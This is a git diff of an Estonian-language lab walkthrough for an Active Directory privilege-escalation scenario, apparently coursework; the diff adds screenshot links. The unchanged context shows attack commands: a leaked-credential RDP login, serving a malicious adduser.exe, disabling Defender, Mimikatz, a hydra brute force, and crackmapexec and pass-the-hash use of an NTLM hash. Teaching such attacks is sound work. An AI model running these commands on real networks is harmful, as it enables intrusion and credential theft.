@@ -1,6 +1,6 @@
 # Golden Ticket Rünnakujuhend
 
-See dokument kirjeldab "Golden Ticket" tüüpi rünnaku stsenaariumit, mis kasutab ära valesti konfigureeritud teenuse õigusi, et saavutada süsteemis kõrgemad privileegid.
+See dokument kirjeldab "Golden Ticket" tüüpi rünnaku stsenaariumi, mis kasutab ära valesti konfigureeritud teenuse õigusi, et saavutada süsteemis kõrgemad privileegid.
 
 ## Eeltingimused ja Keskkond
 
@@ -31,6 +31,8 @@ sudo nmap -sV -O 192.168.1.0/24
 *   `192.168.1.2`: Tuvastatud kui `DC01` domeenis `contoso.com`.
 *   `192.168.1.17`: Tuvastatud avatud pordiga `3389/tcp` (RDP).
 
+![Nmap skaneerimise tulemus](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_53_38.png?raw=true)
+
 ### 2. Sisselogimine kompromiteeritud kontoga
 
 Kasutame lekkinud `henry` kontot, et ühenduda sihtmärkserveriga (`192.168.1.17`) RDP kaudu.
@@ -38,12 +40,14 @@ Kasutame lekkinud `henry` kontot, et ühenduda sihtmärkserveriga (`192.168.1.17
 ```bash
 sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17
 ```
+![RDP ühendus Henry kontoga](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_49_27.png?raw=true)
 
 Pärast ühendumist ava serveris PowerShell ja kontrolli kasutaja õigusi.
 
 ```powershell
 whoami /groups
 ```
+![Kasutaja gruppide kontroll](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_51_51.png?raw=true)
 
 ### 3. Teenuste uurimine
 
@@ -111,6 +115,7 @@ Käivitame `pentest` kaustas Pythoni veebiserveri, et saaksime `adduser.exe` fai
 # Käivita veebiserver pordil 80
 python3 -m http.server 80
 ```
+![Pahavara loomine ja serveerimine](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_20_28.png?raw=true)
 
 Nüüd lae sihtmärkserveri (RDP sessiooni) PowerShellis fail alla:
 
@@ -159,6 +164,7 @@ Seejärel, sihtmärkserveri uues admin-sessioonis (juba `pentest` kasutajana), k
 # Keela reaalajas monitooring (nõuab admin õigusi)
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+![Windows Defenderi keelamine](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_50_12.png?raw=true)
 
 Lae Mimikatz alla ja käivita see mälus, et vältida kettale kirjutamist.
 
@@ -172,6 +178,8 @@ Alternatiivselt, kui laadisid alla `.exe` faili, saad selle käivitada. Enne sed
 ```powershell
 privilege::debug
 ```
+![Mimikatz ja privilege debug](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_50_35.png?raw=true)
+
 See annab vajalikud õigused, et teiste protsesside mälu lugeda.
 
 ---
@@ -200,6 +208,7 @@ hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.
     whoami
     whoami /groups
     ```
+![Impacket Wmiexec](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/0123202601.png?raw=true)
 
 2.  Kasuta `crackmapexec`, et muuta registrit ja lubada "Restricted Admin" režiim, mis on vajalik RDP ühenduseks räsiga:
     ```bash
@@ -210,10 +219,12 @@ hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.
     ```bash
     crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
     ```
+![CrackMapExec registri muutmine](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_48_55.png?raw=true)
 
 4.  Ühendu domeenikontrolleriga RDP kaudu, kasutades `xfreerdp3` ja `pass-the-hash` meetodit:
     ```bash
     sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
     ```
+![RDP ühendus Pass-the-Hash meetodil](https://github.com/ocrHeiki/RAKO/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_14_51_41.png?raw=true)
 
 Pärast edukat sisselogimist saab hakata uurima domeeni struktuuri, kasutajaid (sh peidetud, nt Kerberose kontod) ja grupipoliitikaid läbi "Active Directory Administrative Center"-i.
